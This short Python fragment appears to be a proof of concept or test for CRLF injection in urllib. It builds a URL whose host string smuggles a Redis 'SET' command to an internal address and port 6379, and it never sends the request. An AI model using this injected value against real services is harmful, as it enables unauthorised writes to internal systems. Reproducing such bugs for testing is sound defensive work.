import sys
import urllib
import urllib.error
import urllib.request

host = "10.251.0.83:6379?\r\nSET test success\r\n"
url = "http://" + host + ":8080/test/?test=a"